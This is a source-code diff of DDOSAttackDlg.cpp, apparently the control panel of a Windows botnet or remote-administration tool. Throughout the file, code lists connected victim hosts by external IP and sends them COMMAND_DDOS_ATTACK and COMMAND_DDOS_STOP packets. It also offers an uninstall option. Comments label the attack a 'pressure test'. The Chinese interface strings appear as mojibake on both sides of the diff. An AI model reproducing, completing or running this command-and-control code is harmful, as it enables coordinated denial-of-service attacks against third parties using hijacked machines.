@@ -1,4 +1,4 @@
-// DDOSAttackDlg.cpp : implementation file
+ï»¿// DDOSAttackDlg.cpp : implementation file
 //
 
 #include "stdafx.h"
@@ -9,7 +9,7 @@
 #define new DEBUG_NEW
 #endif
 
-CDDOSAttackDlg* p_CDDOSAttackDlg = NULL;//Ñ¹Á¦²âÊÔ
+CDDOSAttackDlg* p_CDDOSAttackDlg = NULL;//å‹åŠ›æµ‹è¯•
 
 
 extern ISocketBase* g_pSocketBase;
@@ -112,15 +112,15 @@ void CDDOSAttackDlg::OnInitialUpdate()
 	m_ClientList.SetExtendedStyle(dwStyle);
 
 
-	m_ClientList.InsertColumn(0, _T("ÍâÍøIP"), LVCFMT_LEFT, 140);
-	m_ClientList.InsertColumn(1, _T("×´Ì¬"), LVCFMT_LEFT, 65);
+	m_ClientList.InsertColumn(0, _T("å¤–ç½‘IP"), LVCFMT_LEFT, 140);
+	m_ClientList.InsertColumn(1, _T("çŠ¶æ€"), LVCFMT_LEFT, 65);
 
 	HWND hWndHeader = m_ClientList.GetDlgItem(0)->GetSafeHwnd();
 	m_heades.SubclassWindow(hWndHeader);
 	m_heades.SetTheme(new CXTHeaderCtrlThemeOfficeXP());
 
-	m_TabCtrl.InsertItem(0, _T("³£¹æÁ÷Á¿²âÊÔ"));
-	m_TabCtrl.InsertItem(1, _T("×Ô¶¨ÒåÄ£Ê½"));
+	m_TabCtrl.InsertItem(0, _T("å¸¸è§„æµé‡æµ‹è¯•"));
+	m_TabCtrl.InsertItem(1, _T("è‡ªå®šä¹‰æ¨¡å¼"));
 	m_TabCtrl.SetCurSel(0);
 
 	m_WebAttack.Point = this;
@@ -143,9 +143,9 @@ void CDDOSAttackDlg::OnInitialUpdate()
 
 
 	InitailizeStatus();
-	StatusTextOut(0, _T("ÔİÎŞÈÎÎñ"));
+	StatusTextOut(0, _T("æš‚æ— ä»»åŠ¡"));
 	CString Temp;
-	Temp.Format(_T("µ±Ç°ÔÚÏßÖ÷»ú %d Ì¨"), m_ClientList.GetItemCount());
+	Temp.Format(_T("å½“å‰åœ¨çº¿ä¸»æœº %d å°"), m_ClientList.GetItemCount());
 	StatusTextOut(1, Temp.GetBuffer(0));
 
 
@@ -260,10 +260,10 @@ VOID CDDOSAttackDlg::AddClient(ClientContext* pContext)
 {
 	int i = m_ClientList.GetItemCount();
 	m_ClientList.InsertItem(i, pContext->szAddress, 0);
-	m_ClientList.SetItemText(i, 1, _T("¿ÕÏĞ"));
+	m_ClientList.SetItemText(i, 1, _T("ç©ºé—²"));
 	m_ClientList.SetItemData(i, (DWORD_PTR)pContext);
 	pContext->m_Dialog[0] = DDDOS_DLG_IN;
-	pContext->m_Dialog[1] = (int)this;;
+	pContext->m_Dialog[1] = (ULONG_PTR)this;
 
 }
 
@@ -277,7 +277,7 @@ WORD CDDOSAttackDlg::SendDDosAttackCommand(LPATTACK m_Attack, INT HostNums, WORD
 
 	LPBYTE pData = new BYTE[nSize + 1];
 
-	pData[0] = COMMAND_DDOS_ATTACK;//ÃüÁîÏûÏ¢..
+	pData[0] = COMMAND_DDOS_ATTACK;//å‘½ä»¤æ¶ˆæ¯..
 	ATTACK m_Send;
 	memcpy(&m_Send, m_Attack, nSize);
 
@@ -287,21 +287,21 @@ WORD CDDOSAttackDlg::SendDDosAttackCommand(LPATTACK m_Attack, INT HostNums, WORD
 	WORD Count = 0;
 	TCHAR szStatus[500] = { NULL };
 	TCHAR szTask[20] = { NULL };
-	wsprintf(szTask, _T("ÈÎÎñ %d"), iTaskID);
+	wsprintf(szTask, _T("ä»»åŠ¡ %d"), iTaskID);
 
-	//ËµÃ÷ÊÇÑ¡ÖĞÖ÷»ú
+	//è¯´æ˜æ˜¯é€‰ä¸­ä¸»æœº
 	if (HostNums == -1)
 	{
 		for (DWORD i = 0; i < iCount; i++)
 		{
 			if (m_ClientList.GetCheck(i))
 			{
-				//¼ì²éÖ÷»úÊÇ·ñ¿ÕÏĞ×´Ì¬
+				//æ£€æŸ¥ä¸»æœºæ˜¯å¦ç©ºé—²çŠ¶æ€
 				m_ClientList.GetItemText(i, 1, szStatus, 500);
-				if (lstrcmp(szStatus, _T("¿ÕÏĞ")) == 0)
+				if (lstrcmp(szStatus, _T("ç©ºé—²")) == 0)
 				{
 					ClientContext* pContext = (ClientContext*)m_ClientList.GetItemData(i);
-					// ·¢ËÍDDOS ¹¥»÷ÃüÁî
+					// å‘é€DDOS æ”»å‡»å‘½ä»¤
 					m_iocpServer->Send(pContext, pData, nSize + 1);
 					Count++;
 					m_ClientList.SetItemText(i, 1, szTask);
@@ -316,12 +316,12 @@ WORD CDDOSAttackDlg::SendDDosAttackCommand(LPATTACK m_Attack, INT HostNums, WORD
 
 		for (DWORD i = 0; i < (DWORD)HostNums; i++)
 		{
-			//¼ì²éÖ÷»úÊÇ·ñ¿ÕÏĞ×´Ì¬
+			//æ£€æŸ¥ä¸»æœºæ˜¯å¦ç©ºé—²çŠ¶æ€
 			m_ClientList.GetItemText(i, 1, szStatus, 500);
-			if (lstrcmp(szStatus, _T("¿ÕÏĞ")) == 0)
+			if (lstrcmp(szStatus, _T("ç©ºé—²")) == 0)
 			{
 				ClientContext* pContext = (ClientContext*)m_ClientList.GetItemData(i);
-				// ·¢ËÍDDOS ¹¥»÷ÃüÁî
+				// å‘é€DDOS æ”»å‡»å‘½ä»¤
 				m_iocpServer->Send(pContext, pData, nSize + 1);
 				Count++;
 				m_ClientList.SetItemText(i, 1, szTask);
@@ -344,21 +344,21 @@ WORD CDDOSAttackDlg::SendDDostStopCommand(WORD iTaskID)
 	TCHAR szStatus[500] = { NULL };
 
 	TCHAR szTask[20] = { NULL };
-	wsprintf(szTask, _T("ÈÎÎñ %d"), iTaskID);
+	wsprintf(szTask, _T("ä»»åŠ¡ %d"), iTaskID);
 
 	BYTE pData[2] = { COMMAND_DDOS_STOP,0 };
 
 	for (DWORD i = 0; i < iCount; i++)
 	{
-		//¼ì²éÖ÷»úÊÇ·ñ¿ÕÏĞ×´Ì¬
+		//æ£€æŸ¥ä¸»æœºæ˜¯å¦ç©ºé—²çŠ¶æ€
 		m_ClientList.GetItemText(i, 1, szStatus, 500);
 		if (lstrcmp(szStatus, szTask) == 0)
 		{
 			ClientContext* pContext = (ClientContext*)m_ClientList.GetItemData(i);
-			// ·¢ËÍDDOS ¹¥»÷ÃüÁî
+			// å‘é€DDOS æ”»å‡»å‘½ä»¤
 			m_iocpServer->Send(pContext, &pData[0], 2);
 			Count++;
-			m_ClientList.SetItemText(i, 1, _T("¿ÕÏĞ"));
+			m_ClientList.SetItemText(i, 1, _T("ç©ºé—²"));
 		}
 	}
 	return Count;
@@ -370,9 +370,9 @@ void CDDOSAttackDlg::OnRclickList(NMHDR* pNMHDR, LRESULT* pResult)
 
 	CMenu menu;
 	VERIFY(menu.CreatePopupMenu());
-	menu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("Ğ¶ÔØ(&S)"));
-	menu.AppendMenu(MF_STRING | MF_ENABLED, 150, _T("Ñ¡Ôñ(&S)"));
-	menu.AppendMenu(MF_STRING | MF_ENABLED, 200, _T("È¡Ïû(&S)"));
+	menu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("å¸è½½(&S)"));
+	menu.AppendMenu(MF_STRING | MF_ENABLED, 150, _T("é€‰æ‹©(&S)"));
+	menu.AppendMenu(MF_STRING | MF_ENABLED, 200, _T("å–æ¶ˆ(&S)"));
 	CPoint	p;
 	GetCursorPos(&p);
 	int nMenuResult = CXTPCommandBars::TrackPopupMenu(&menu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, this, NULL);
@@ -385,7 +385,7 @@ void CDDOSAttackDlg::OnRclickList(NMHDR* pNMHDR, LRESULT* pResult)
 		int iItem;
 		for (iItem = m_ClientList.GetItemCount() - 1; iItem >= 0; iItem--)
 		{
-			if (LVIS_SELECTED == m_ClientList.GetItemState(iItem, LVIS_SELECTED))     //·¢ÏÖÑ¡ÖĞĞĞ
+			if (LVIS_SELECTED == m_ClientList.GetItemState(iItem, LVIS_SELECTED))     //å‘ç°é€‰ä¸­è¡Œ
 			{
 				ClientContext* p_ClientContext = (ClientContext*)m_ClientList.GetItemData(iItem);
 				if (p_ClientContext)
@@ -427,7 +427,7 @@ void CDDOSAttackDlg::OnRclickList(NMHDR* pNMHDR, LRESULT* pResult)
 		break;
 	}
 	CString Temp;
-	Temp.Format(_T("µ±Ç°ÔÚÏßÖ÷»ú %d Ì¨"), m_ClientList.GetItemCount());
+	Temp.Format(_T("å½“å‰åœ¨çº¿ä¸»æœº %d å°"), m_ClientList.GetItemCount());
 	StatusTextOut(1, Temp.GetBuffer(0));
 
 	menu.DestroyMenu();
